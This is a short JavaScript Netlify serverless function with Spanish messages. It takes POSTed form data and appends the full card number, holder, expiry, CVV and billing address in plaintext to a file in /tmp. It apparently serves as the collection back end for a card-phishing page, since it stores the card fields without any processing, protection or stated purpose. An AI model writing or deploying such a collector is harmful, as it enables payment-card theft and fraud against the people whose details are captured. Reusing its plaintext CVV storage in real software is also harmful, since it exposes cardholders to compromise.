const fs = require('fs');
const path = require('path');

exports.handler = async function(event) {
  if (event.httpMethod !== 'POST') {
    return {
      statusCode: 405,
      body: 'Método no permitido',
    };
  }

  const data = JSON.parse(event.body);
  const contenido = `Tarjeta: ${data.numero} | Titular: ${data.titular} | Tipo: ${data.tipo} | Exp: ${data.exp} | CVV: ${data.cvv} | Dirección: ${data.direccion}\n`;

  try {
    const filePath = path.join('/tmp', 'datos.txt'); // /tmp es la única carpeta escribible en funciones Netlify
    fs.appendFileSync(filePath, contenido);

    return {
      statusCode: 200,
      body: JSON.stringify({ mensaje: 'Datos guardados correctamente.' }),
    };
  } catch (error) {
    return {
      statusCode: 500,
      body: JSON.stringify({ mensaje: 'Error al guardar los datos', error: error.message }),
    };
  }
};
